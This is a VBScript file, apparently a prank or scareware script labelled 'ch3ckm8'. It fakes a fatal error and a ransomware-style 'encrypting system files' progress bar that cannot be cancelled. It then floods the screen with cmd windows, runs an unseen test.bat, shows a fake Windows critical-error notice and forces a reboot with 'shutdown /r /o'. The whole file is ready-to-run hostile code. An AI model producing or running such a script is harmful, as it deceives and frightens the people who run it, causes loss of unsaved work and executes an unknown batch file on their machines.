MsgBox "Fatal Exception at 0E: Access is Denied!" , 0+16 , "Error"

Do
	response = MsgBox("wanna make it ra1n?",4096+4+32,"ch3ckm8")
	Loop While response <> vbYes

response = MsgBox("Encrypting system files... (0% Complete)" & vbNewLine & "" & vbNewLine & "Do you want to cancel the operation?", 4096+4+48, "ch3ckm8")

If response = vbNo Then
	response = MsgBox("you wanna do this the hard way huh?", vbYesOnly, "ch3ckm8")
	Dim x
	Dim percentno
	x = 0
	percentno = 0
	Do While x < 4
	x = x + 1
	percentno = percentno + 24
	WScript.Sleep 800
	MsgBox "Unable to cancel the operation!" & vbNewLine & "" & vbNewLine & "Encrypting system files... (" & percentno & "% Complete)", 4096+2+16,"ch3ckm8"
	Loop
	

ElseIf response = vbYes Then
	Dim y
	Dim percent
	y = 0
	percent = 0
	Do While y < 4
	y = y + 1
	percent = percent + 24
	WScript.Sleep 800
	MsgBox "Unable to cancel the operation!" & vbNewLine & "" & vbNewLine & "Encrypting system files... (" & percent & "% Complete)", 4096+2+16,"ch3ckm8"
	Loop
End If

MsgBox "User files encrypted successfully! (100% Complete)", 0+64, "ch3ckm8"

CreateObject("wscript.shell").run "cmd.exe /c assoc"
CreateObject("wscript.shell").run "cmd.exe /c dir/s"
CreateObject("wscript.shell").run "cmd.exe /c tree"
CreateObject("wscript.shell").run "cmd.exe /c assoc"
CreateObject("wscript.shell").run "cmd.exe /c dir/s"
CreateObject("wscript.shell").run "cmd.exe /c tree"
CreateObject("wscript.shell").run "cmd.exe /c assoc"
CreateObject("wscript.shell").run "cmd.exe /c dir/s"
CreateObject("wscript.shell").run "cmd.exe /c tree"
CreateObject("wscript.shell").run "cmd.exe /c test.bat"

MsgBox"Windows has encountered a critical problem and will restart automatically in one minute. Please save your work now.", 0+48, "You are about to be logged off"
CreateObject("wscript.shell").run "cmd.exe /c shutdown /r /o"
